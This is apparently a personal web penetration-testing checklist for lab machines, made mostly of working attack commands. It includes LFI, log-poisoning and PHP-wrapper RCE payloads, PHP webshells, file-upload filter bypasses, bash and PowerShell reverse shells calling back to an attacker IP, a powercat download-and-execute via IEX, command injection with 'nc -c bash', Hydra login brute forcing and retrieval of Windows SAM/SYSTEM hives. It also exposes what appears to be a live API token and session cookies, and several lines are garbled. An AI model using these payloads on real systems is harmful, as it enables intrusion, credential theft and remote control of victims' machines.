# HTTP Checklist

1. Fingerprint with Nmap, then run script to enumerate further
```bash
sudo nmap -p80 --script=http-enum $ip
```
2. Analyze tech stack with Wappalyzer

3. Brute force directories, subdomains, files and apis
```bash
# /opt/SecLists/Discovery/Web-Content/combined_directories-lowercase.txt
gobuster dir -u http://loopback:9000 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -k -t 30
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_directories-lowercase.txt --hc 404 "http://jeeves.htb:50000/FUZZ/"
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://editorial.htb/FUZZ"
gobuster dns -d soccer.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
gobuster dir -u http://$ip -w /opt/SecLismember_home.jspts/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x php,txt,html,whatever
# for api busting
cp /opt/SecLists/Discovery/Web-Content/api/objects.txt apis
sed -i 's/^/{GOBUSTER}\//' apis
gobuster dir -u http://$ip:5002 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -p apis
# If you get hits, try to discover more directories using a smaller wordlist

# Once you have the hostname, search for vhost
feroxbuster -k -u https://streamio.htb -x php -o streamio.htb.feroxbuster -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
[Enter] -> c -f {number of search to cancel}

# Fuzzing APIs
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/objects.txt --hc 404 $url/FUZZ
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt --hc 404 $url/FUZZ
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt --hc 404 $url/FUZZ
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_words.txt --hc 404 $url/FUZZ
ffuf -k -u $url/api/FUZZ -w ~/repos/offsec/lists/lil-fuzz.txt
ffuf -k -u $url/api/FUZZ -w ~/repos/offsec/lists/sqli.txt
curl -X POST -H 'Content-Type: application/json' --data '{"user": "admin", "url", "http://192.168.45.178/update"}' http://192.168.193.134:13337/update
curl -si --data '{"user": "admin", "url", "http://192.168.45.178/update"}' http://192.168.193.134:13337/updat
```
4. Nikto
```bash
nikto --host $ip -ssl -evasion 1
```
5. Manual code inspection

- Look for emails, names, user info, versioning (chhttp://editorial.htb/upload?ecking with searchsploit), examine input box code (checking for hidden form fields), anything interesting, check out robots.txt & sitemap.xml
- Inspect every fkn inch of the website

5. LFI

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt

KNOW THAT YOU CAN PIVOT TO WHOEVER IS RUNNING HTE WEBSERVER ONCE YOU HAVE INITIAL ACCESS. or write abilities in a web folder.

6. WordPress

WPscan if it's wordpress

```bash
wpscan --url $url --enumerate p --plugins-detection aggressive # aggressive plugin detection
wpscan --url $url --disable-tls-checks --enumerate vp,vt,u,dbe --plugins-detection aggressive --plugins-version-detection aggressive --api-token KvAyO8bM4TYYDwJJMNhoU95g591rdNvk3jiKpQHG5uY
wpscan --url $url --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt # use the usernames that you have from above
```

```bash
gobuster dir -u http://$ip -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -k -t 10 --exclude-length 6
gobuster dir -u http://$ip -w /opt/SecLists/Discovery/Web-Content/CMS/wp-themes.fuzz.txt -k -t 10 --exclude-length 6
```

Look at the cookies.. if there's a cookie name that you don't know, it could be coming from a plugin that has a vulnerability, such as pmpro_visit=1.

7. Potentially brute forcing admin/login panel with Burp Intruder

8. Create a wordlist from the webpage using cewl:

```bash
cewl http://example.com -d 4 -m 5 -w cewl.txt
hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule cewl.txt > cewl-best64.txt
```

9. Run droopescan
```bash
droopescan -t <number_of_threads> <target_website>
```

10. XSS (Input Fields)
- Spam special characters, see what is filtered, what gets interpreted as code
```bash
~!@#$%^&*()-_+={}][|\`,./?;:'"<>
```
- If our input is being added between div tags, we'll need to include our own script tags4 and need to be able to inject "<" and ">" as part of the payload
- If our input is being added within an existing JavaScript tag, we might only need quotes and semicolons to add our own code

11. 403 Forbidden Bypass

Refer to 403-forbidden-bypass.sh.

12. Header Injection

- Check if you can inject the following into the User-Agent header:

```bash
<script>alert(42)</script>
# or the following to see if it pings your python http server
<a href="http://192.168.192.121:8000/your-endpoint">Send GET Request</a>
```

If so, try injecting a reverse shell.

```bash
# on your machine, try to remove all special characters through strategic spacing
echo -n 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1' | base64
# send the following
echo BASE64_ENCODED_STRING | base64 -d | bash
# or
echo -n "bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'" | base64
# send the following
echo BASE64_ENCODED_STRING | base64 -d
# or the following if spaces aren't allowed
{echo,-n,**base64 encoded reverse bash shell**}|{base64,-d}|bash
```

13. Directory Traversal

- For directory traversals, try to start with a '/', so "http://192.168.165.43/index.php?p=backup/../../../../../../../../"

- If there's something like "https://example.com/cms/login.php?language=en.html", then try to navigate to the file directly with "https://example.com/cms/en.html". If you can, this confirms that en.html is a file on the server and it may be vulnerable to something like "http://example.com/subdir/index.php?page=../../../../../../../../../etc/passwd"

- Try double and triple encoding, "..././", "..;/", and potentially unicode encoding as referenced in the document below

- Refer to (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#16-bits-unicode-encoding) for a whole bunch of awesome payloads, and interesting files to look for on both Windows and Linux. Doesn't include "C:\Windows\System32\drivers\etc\hosts", "C:\inetpub\logs\LogFiles\W3SVC1\\", and "C:\inetpub\wwwroot\web.config"

Try seeing if you can get the php source code:

```bash
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
```
I ran into a page that said "Only accessable through includes". This is referring to a header, "include=", where you can include files and possibly execute code.

WHENEVER YOU'RE SENDING A POST REQUEST, INCLUDE THE CONTEXT-TYPE HEADER, like 'Content-Type: application/x-www-form-urlencoded'.

```bash
include=echo+WAZZUP%3b
include=/etc/passwd
include=http://10.10.14.8:8000/fake
include=http://10.10.14.8:8000/reverse-shell.php
include=reverse-shell.php
```
When testing for a php reverse shell, you can make a simple php file that says "echo WAZZUP;" and check whether "WAZZUP" is returned in the response.

If that doesn't work, you could have him connect back to us so that we could crack the hash.

Check out the sam and system files:

```bash
wget http://192.168.33.165/..%5C..%5C..%5C..%5C..%5Cwindows..%5Csystem..%5Cconfig..%5Cregback..%5Csystem.old -O SYSTEM
wget http://192.168.33.165/..%5C..%5C..%5C..%5C..%5Cwindows..%5Csystem..%5Cconfig..%5Cregback..%5Csam.old -O SAM
```

14. Stealing Session Cookies

- See if there are any cookies present without the HttpOnly and Secure flags. If this is in the context of WordPress, there's a walkthrough in ../notes/web_assessment_and_xss.md.

15. Log Poisoning / Local File Inclusion

- RCE (PHP) through log poisoning (likely /var/log/apache2/access.log). See if you can read the file and see what contents are stored (i.e. User-Agent):

```bash
curl http://example.com/subdir/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

If so, use Burp to change the user agent header:
```bash
<?php echo system($_GET['cmd']); ?>
```

And see if you can execute commands like the following, if so, try a url encoded bash or php reverse shell:

```
GET /subdir/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls
```

..if something else, do something else.

16. PHP Wrappers

Attempt to show the contents of php file:

```bash
curl http://example.com/subdir/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

Attempt to achieve code execution:

```bash
curl "http://example.com/subdir/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
# if works, then
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://example.com/subdir/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
# or a reverse shell
```

17. Remote File Inclusion

- If the website is loading files or contents from remote systems, then RFI may be possible. You can go into Developer Tools to discover this in source, etc.

```bash
cp /usr/share/webshells/php/simple-backdoor.php .
python3 -m http.server
curl "http://example.com/subdir/index.php?page=http://$YOUR_IP/simple-backdoor.php&cmd=ls"
```

18. File Upload Vulns (Executable)

THINK ABOUT RCE WHENEVER YOU HAVE LFI.

THINK ABOUT LOCAL FILE INCLUSION.


For PDF bypass, try to add the "%PHP-1.7\n%" thing at the top and change the name to reverse.pdf.php.

```bash
http://192.168.180.231/?cwd=../../../../../../../../home/remi&file=.ssh&download=true
```

You can upload as cmd.jpg then intercept and switch to cmd.jpg.php.

- Wherever you can upload files, see what files you are allowed to upload. If .php files are blacklisted, then you can try to use .pHP, .phps, .php7, pht, phpt, phtml, php3, php4, php5, php6 instead. If .sh files are blacklisted, then you can try to use .zsh instead.

- Whitelisting may be able to be bypassed through methods such as adding a null byte injection, "payload.php\x00.png", "shell.php%00.txt", "echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png", or by using double extensions for the file, "shell.txt.php"

```bash
#!/bin/sh
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
echo '<?php system($_REQUEST['cmd']); ?>' >> mime_shell.php.png
```

- Try changing the Content-Type header in Burp to something that you know it accepts, such as s image/jpeg, image/gif, image/png.

- See if you can intercept and modify the files, naming the php file shell.txt initially, then changing it to shell.php.

- With Windows, replace php with aspx in the examples if you don't know what to use.

- If you're able to upload a simple webshell, then see if you can execute commands:

```bash
curl http://example.com/meteor/subdir/simple-backdoor.pHP?cmd=dir
```
Here's a crazy good resource for a high level gauntlet of what you can do, "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload".

If you can, then get a reverse shell with powershell (>-<):

```bash
kali@kali:~$ pwsh
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0
...
PS> exit
kali@kali:~$ nc -nvlp 4444
kali@kali:~$ curl http://example.com/subdir/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAG...
```

- See if you can overwrite files, such as authorized_keys. Worst case, you may get information about the web stack

```bash
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
echo '<?php system($_REQUEST['cmd']); ?>' >> mime_shell.php.png
```
19. File Upload Vulns (Non-Executable)

- When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.

- With Burp, try testing directory traversal by modifying the file's name. If the response includes the modified pathname, then it's a good sign that it worked, though it could've just sanitized it internally.

- If this works, then try to blindly overwrite write in the database, such as the ssh key, and then ssh in:

```bash
kali@kali:~$ ssh-keygen
kali@kali:~$ cat keyname.pub > authorized_keys
```

Then, use the method as told above on the path "../../../../../../../root/.ssh/authorized_keys" or "/home/www-data/.ssh/authorized_keys", noting that you can try a username instead or "~/.ssh/authorized_keys" or "%USERPROFILE%\.ssh\authorized_keys" for Windows. If you can read /etc/passwd, then adjust to the names. Make sure to delete the known_hosts file if you have used the key with another machine. I assume that you can also just create a new one to use without deleting the file.

20. OS Command Injection

If there's any part of the website that intakes commands, see if you can add your own. They're likely filtered, though you may be able to get around this by closing off the command with a semicolon. In the following example, we saw (with Burp) that the commands were being sent through the Archive header with a Post:

```bash
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive # to find out if the commands are executed by CMD or Powershell
```

Given that it's Powershell:

```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
nc -lvnp 4444
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

21. SQL Injection

- Refer to ./sqli.md

22. Client-Side Attacks

If there if a section where you can mail the company, refer to ../notes/client_side_attacks.md. Also look out for svc, anything where files with Macros can be accepted.

23. Exiftool

Use exiftool to analyze a few documents on the website, see what information you can get. Wget will give you better information than curl.

24. Brute-Force Passwords

Refer to ../notes/password_cracking.md

Additional Resources at "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web".

25. API

````
http://192.168.214.150:8080/search
{"query":"*","result":""}
````
````
curl -X GET "http://192.168.214.150:8080/search?query=*"
{"query":"*","result":""}

curl -X GET "http://192.168.214.150:8080/search?query=lol"
{"query":"lol","result":""}
````
---

````
curl http://$ip/api/
````
````
[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}] 
````
````
curl http://$ip/api/user/ 
````
````
[{"login":"UserA","password":"test12","firstname":"UserA","lastname":"UserA","description":"Owner","id":10},{"login":"UserB","password":"test13","firstname":"UserB","lastname":"UserB","description":"Owner","id":30},{"login":"UserC","password":"test14","firstname":"UserC","lastname":"UserC","description":"Owner","id":6o},{"login":"UserD","password":"test15","firstname":"UserD","lastname":"UserD","description":"Owner","id":7o},{"login":"UserE","password":"test16","firstname":"UserE","lastname":"UserE","description":"Owner","id":100}]
````

##### Fuzzing URL

An amazing resource is Cobalt's SSTI page.
```bash
# Copy request from burpsuite to file, search.req
# Insert FUZZ where you want to fuzz
ffuf -request search.req -request-proto http -w /opt/SecLists/Fuzzing/special-chars.txt
# Below for post
# ffuf -u http://editorial.htb/upload-cover -X POST -request request.txt -w ports.txt:FUZZ -fs 61
# If you wanted to match size of a particular response, you could add '-ms 0'
# Filtering by lines would be '--fl 34'
# Check for quick SQL injection, adding url-encoded ';#---, so '%27%3B%23---'
# Depends on the language being used, if Python, test string concatenation, such as adding "sup')%2B'dawg'"%23. The %23 is to comment out remaining command
&query=sup')%2Bprint('hi')%23
&query=sup')%2B__import__('os').system('id')%23
&query=sup')%2B__import__('os').system('echo%20-n%20YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC84MCAwPiYxICcK%20|base64%20-d|bash')%23
```

Multiple paramaters:

```bash
ffuf -request search.req -request-proto http -w emails.txt:USER -w ../../passwords.txt:PASS
```

Fuzzing directly in URL, in this case, testing for parameters.

```bash
ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt
```

If you need to be authorized/logged in:

```bash
ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=k2285854j74rk51pctgl7kes34'
```

If you run into an api, start testing with curl. If csrf is there, execute code.

```bash
curl -si --data "code=1+1" # {7*7}...
curl http://192.168.195.117:50000/verify -si --data "code=os.system('nc -c bash 192.168.45.178 50000')"
```

SQLi.

```bash
ffuf -request sql.req -request-proto http -w ~/repos/offsec/lists/sqli.txt:FUZZ
```

#### Retrieve cookie, response headers

```bash
curl -I http://$ip/filemanager/ # (retrieves a fresh cookie)
```

#### WAF Access Denied

Try adding X-Forwarded-For to gain some trust.

```bash
curl -H 'X-Forwarded-For: localhost' http://192.168.193.134:13337/logs
wfuzz -c -z file,/home/kali/repos/offsec/lists/lfi.txt --hc 404,500 -H 'X-Forwarded-For: localhost' 'http://192.168.193.134:13337/logs?file=FUZZ'
curl -X POST -H 'X-Forwarded-For: localhost' -H 'Content-Type: application/json' --data '{"user":"clumsyadmin", "url":";nc -c bash 192.168.45.178 443"}' 'http://192.168.193.134:13337/update'
```
#### Fuzzing Input Paramater

Find the parameter in Burp to what you want to FUZZ, as well as the Content-Type in Request Headers.
```
ffuf -u https://watch.streamio.htb/search.php -d "q=FUZZ" -w /opt/SecLists/Fuzzing/special-chars.txt -H 'Content-Type: application/x-www-form-urlencoded'
```

Note that it sends the payload non-url-encoded.

#### Hydra for Popups

```bash
hydra -l user -P pwdpath ip http-get
# -I to override previous scan with updated list
```

#### Hydra for Webapp Login Brute

```bash
hydra -L user.txt -P pass.txt 10.10.123.83 http-post-form "/Account/login.aspx:__VIEWSTATE=hRiqPHaIdHtHLPKokY59%2B3WUD9ZtsmFSLG55rJABKbT96KUnil6PSus2s75rJc8vTAE%2FEwshWpfpFAiJph7q2PzNZ37cCzPieJzYqs9QMUT947ZVfG7IbjK6qCzrjcKpMsqoov6Ux5RgPM9%2FW7IoWO8%2FXpP7Nbs7NS6xWBQr7s%2B1oUL%2B&__EVENTVALIDATION=fPja7KnrVpkm0bLBQSRGAe%2FmniIYroH63YCNKLdpLMgJN1lAWkehyJsp7MO1wKFsmMrrrm2IU594ajRCbyTN06CR2ew3apQGWSgeYHFacGYWD7509OV%2BqPO3wYCge9Jxl7MSgI%2Fny5yRTI30DifQFZDuopQAKaObXPbgfpYF3EA6UR8K&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

#### Hydra for Base64 encoded login

```bash
cewl http://$ip:8081/ -d 8| grep -v CeWL >> custom-wordlist.txt
cewl --lowercase http://$ip:8081/ -d 8| grep -v CeWL  >> custom-wordlist.txt
# -I : ignore any restore files
# -f : stop when a login is found
# -L : username list
# -P : password list
# ^USER64^ and ^PASS64^ tells hydra to base64-encode the values
# C=/ tells hydra to establish session cookies at this URL
# F=403 tells hydra that HTTP 403 means invalid login
hydra -I -f -L usernames.txt -P custom-wordlist.txt 'http-post-form://$ip:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://$ip:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
```

#### Finding Root Directory

Refer to 'https://github.com/fuzzdb-project/fuzzdb/tree/master/discovery/predictable-filepaths/webservers-appservers' for application specific seen locations.


Example post request.

````
POST /serverinfo HTTP/1.1
Host: 192.168.214.114:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.214.114:8080/serverinfo
Content-Type: application/x-www-form-urlencoded
Content-Length: 185
Origin: http://192.168.214.114:8080
Connection: close
Cookie: _forum_on_rails_session=XuJdkOzvkY%2FGvsLTdPUryTm0axW3Bd%2FAVmJACm26u3uZGWKZnGpK4wqlObwLM0XbSDTaylpMHj%2F4T7RWss%2FqRkviuuKxX%2FIWjd1%2BNrsW5K6iPVZZxVfHAYsilSAytzTY5Ri0jaF4FQeYMQ1Tt7NH3UMs57dpyYqrwnGIFSuOueWgLLuKLZYlNXUazlGgSYUut9il%2BVa5BYOeC2LNrJR2IHvSDdMuAuTyik1%2BYmuM7oJ2ylQOE2rz0Qpl2YmRvd8azD%2Frm6LvZnwqMT7GgpcCpZGUVkbUlEEenah9YvLUC7eGFudR21A0KZGs7AcJs4HLzLezy5qpNS%2FwwUChwgrqTyWSE8ggV6E8ksjfw9tQZZCHPi1wwfoLYuasX%2Bos%2FrJfhxDOYx9fhH1m7Ock5KTt--bD0GYoMPTFK2RvBc--fNbrpxQT53InzNaJdcdDRQ%3D%3D
Upgrade-Insecure-Requests: 1

authenticity_token=U%2FJaPjmyotmZ3naPc7Iw%2B5FwSGBkFmr6DlMTJqWmE9a7AX1%2B7HKngOYcEehoo%2F4Xo3NDkGa%2FJK2OzVFYTcpMxA%3D%3D&cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.45.178%2F443+0%3E%261
````

````
POST /db/?clickhouse=localhost&username=admin&db=evil&import= HTTP/1.1
Host: 192.168.193.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.193.109/db/?clickhouse=localhost&username=admin&db=evil&import=
Content-Type: multipart/form-data; boundary=---------------------------399488293235751044031263878276
Content-Length: 623
Origin: http://192.168.193.109
Connection: close
Cookie: adminer_permanent=; adminer_settings=defaults%3D1; adminer_engine=MergeTree; adminer_sid=u78erfhdgia68p3qiul0bicsgn; adminer_key=d146d6a494537a572ef3222fec668a40; adminer_version=4.8.1
Upgrade-Insecure-Requests: 1

-----------------------------399488293235751044031263878276
Content-Disposition: form-data; name="sql_file[]"; filename="cmd.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>

-----------------------------399488293235751044031263878276
Content-Disposition: form-data; name="error_stops"

1
-----------------------------399488293235751044031263878276
Content-Disposition: form-data; name="only_errors"

1
-----------------------------399488293235751044031263878276
Content-Disposition: form-data; name="token"

738807:409982
-----------------------------399488293235751044031263878276--

````